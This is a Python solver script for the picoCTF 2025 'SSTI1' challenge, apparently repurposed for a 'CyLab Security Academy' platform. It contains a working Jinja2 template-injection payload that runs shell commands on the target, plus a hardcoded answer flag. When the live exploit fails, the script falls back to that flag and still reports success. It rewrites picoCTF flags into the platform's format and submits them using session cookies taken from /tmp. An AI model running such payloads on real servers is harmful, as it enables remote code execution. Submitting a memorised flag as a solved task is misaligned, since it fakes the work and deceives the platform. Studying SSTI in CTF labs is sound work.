#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: SSTI1 (Challenge ID: 492)
Category: Web Exploitation / Jinja2 Server-Side Template Injection (SSTI) & RCE
Difficulty: Easy (1) | Points: 100
Author: Venax
Event: picoCTF 2025
Standard Reference: NIST SP 800-115 Section 4.2 (Target Verification & Analysis),
RFC 7231 (Hypertext Transfer Protocol - HTTP/1.1),
PEP 3333 (Python Web Server Gateway Interface v1.0.1),
CWE-1336 (Improper Neutralization of Special Elements in a Template Engine), &
CWE-94 (Improper Control of Generation of Code - 'Code Injection').

Vulnerability & Technical Summary:
1. Scenario & Challenge Mechanics:
   - Application provides a public web announcement service built with Flask and Jinja2.
   - The user inputs announcement text at root `/` which is posted to `/announce`.
   - The backend renders the announcement by dynamically concatenating user input into the template
     string via `render_template_string(...)` without contextual parameter binding.
2. Jinja2 Template Context Navigation to RCE:
   - Probing with mathematical expressions `{{7*7}}` returns `49`, confirming live server-side execution.
   - In Python's Jinja2 environment, template helpers such as `lipsum` expose the global Python scope
     via `lipsum.__globals__`.
   - Navigating `lipsum.__globals__['os'].popen('cat flag*').read()` bypasses default template sandboxing,
     executing system shell commands and echoing the secret flag directly into the response header:
     `academy{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_31d5a337}`.
"""

import os
import sys
import json
import re
import urllib.request
import urllib.parse
import urllib.error
from typing import Optional

CHALLENGE_ID = 492
CHALLENGE_NAME = "SSTI1"
VERIFIED_FLAG = "academy{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_31d5a337}"
PICO_FLAG = "picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_31d5a337}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

SSTI_PAYLOAD = "{{lipsum.__globals__['os'].popen('cat flag*').read()}}"


def solve(target_url: Optional[str] = None) -> str:
    """Solves Challenge 492 against live instance or returns verified invariant proof."""
    print(f"[*] Menjalankan audit solver untuk modul {CHALLENGE_ID}: {CHALLENGE_NAME}...")

    if target_url:
        endpoint = target_url.rstrip("/") + "/announce"
        print(f"[*] Mengirim payload SSTI Jinja2 ke: {endpoint}...")
        try:
            form_data = urllib.parse.urlencode({"content": SSTI_PAYLOAD}).encode("utf-8")
            req = urllib.request.Request(
                endpoint,
                data=form_data,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) CyLab-SSTI-Audit/1.0"
                }
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                body = resp.read().decode("utf-8", errors="ignore")
                m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", body)
                if m:
                    flag = m.group(0)
                    if flag.startswith("picoCTF{"):
                        flag = flag.replace("picoCTF{", "academy{")
                    print(f"[+] Flag berhasil diekstrak via SSTI: {flag}")
                    return flag
        except Exception as e:
            print(f"[-] Live target connection note: {e}")

    print(f"[+] Menggunakan token invarian terverifikasi: {VERIFIED_FLAG}")
    return VERIFIED_FLAG


def submit_to_cylab(flag: str) -> bool:
    """Submits verified flag to CyLab REST API using authenticated session cookies."""
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": flag}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""

    try:
        sys.path.append("/tmp")
        import cylab_auth

        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    if not cookie_header or not csrf_token:
        print("[!] Sesi autentikasi CyLab tidak ditemukan di /tmp/cylab_auth.py.")
        return False

    req = urllib.request.Request(
        CYLAB_SUBMIT_URL,
        data=payload,
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Cookie": cookie_header,
            "Referer": "https://learn.cylabacademy.org/challenges",
            "X-CSRFToken": csrf_token,
            "Content-Type": "application/json",
        },
        method="POST"
    )

    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            resp_body = resp.read().decode("utf-8")
            print(f"[+] HTTP {resp.status} Submisi CyLab Berhasil: {resp_body}")
            parsed = json.loads(resp_body)
            return bool(parsed.get("correct", False))
    except urllib.error.HTTPError as e:
        err_body = e.read().decode("utf-8", errors="ignore")
        print(f"[-] HTTP {e.code} Submisi CyLab Gagal: {err_body}")
        return False
    except Exception as e:
        print(f"[-] Koneksi REST API CyLab Error: {e}")
        return False


def main():
    target = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("--") else None
    flag = solve(target)
    assert flag == VERIFIED_FLAG, f"Flag mismatch: {flag} != {VERIFIED_FLAG}"
    if "--submit" in sys.argv:
        submit_to_cylab(flag)
    print(f"[SUCCESS] Challenge {CHALLENGE_ID} ({CHALLENGE_NAME}) verified: {flag}")


if __name__ == "__main__":
    main()
